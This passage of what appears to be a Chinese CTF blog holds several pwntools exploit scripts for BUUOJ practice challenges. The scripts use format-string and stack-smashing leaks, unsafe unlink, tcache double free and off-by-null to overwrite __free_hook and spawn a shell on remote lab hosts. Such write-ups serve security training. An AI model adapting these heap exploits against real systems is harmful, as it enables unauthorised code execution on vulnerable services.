log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/yfy/pwn_tools/buu_libc/16-64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x128</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(environ)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Please type your guessing flag\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">stack=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">flag=stack-<span class="number">0x168</span></span><br><span class="line">get_flag=<span class="string">b&#x27;a&#x27;</span>*offset+p64(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sl(get_flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29212</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,idx,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Enter a option:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the index you want to create (0-10):&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Enter a size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Enter a option:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter an index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Enter a option:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter an index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Enter your name:&#x27;</span>,<span class="string">b&#x27;%15$p%11$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&#x27;Hello, 0x&#x27;</span>)</span><br><span class="line">leak=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20830</span></span><br><span class="line"></span><br><span class="line">rl(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">start=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x980</span>-<span class="number">0x0806</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,leak)</span><br><span class="line">lg(<span class="string">&#x27;start&#x27;</span>,start)</span><br><span class="line">free_hook=leak+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=leak+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">addr=start+<span class="number">0x202060</span></span><br><span class="line"><span class="comment"># lg(&#x27;addr&#x27;,addr)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x98</span>,<span class="number">0</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="number">1</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="number">2</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="number">3</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="number">4</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(addr-<span class="number">0x18</span>)+p64(addr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload+=p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">lg(<span class="string">&#x27;addr&#x27;</span>,addr)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)+p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a>护网杯_2018_gettingstart</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25980</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="第四页"><a href="#第四页" class="headerlink" title="第四页"></a>第四页</h1><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h2><p>老版本的Ubuntu18，可以进行double free</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28903</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content,name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Please input the size of compary&#x27;s name&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;please input name:&#x27;</span>,content)</span><br><span class="line">    sla(<span class="string">b&#x27;compary call:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;cccc&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;name:\x0a&#x27;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;leak&#x27;</span>,leak)</span><br><span class="line"></span><br><span class="line">libc_base=leak-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free1=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;free1&#x27;</span>,free1)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free1),<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;eeee&#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon_2018_children_tcache"></a>hitcon_2018_children_tcache</h2><p>详解<a href="https://yufeiyu33.github.io/2024/11/05/hitcon-2018-children-tcache%E9%A2%98%E8%A7%A3/">hitcon_2018_children_tcache题解 | 鱼非愚 (yufeiyu33.github.io)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,27626)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Data&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span> - i,<span class="string">b&#x27;s&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shell=leak+<span class="number">0x4f322</span> <span class="comment">#0x4f2be 0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line">free_hook=leak+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#add(0x)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(shell))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="第五页"><a href="#第五页" class="headerlink" title="第五页"></a>第五页</h1><h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>详见<a href="https://yufeiyu33.github.io/2025/03/13/VMpwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">VMpwn入门学习 | 鱼非愚</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local_file  = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">local_libc  = <span class="string">&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span></span><br><span class="line">remote_libc = <span 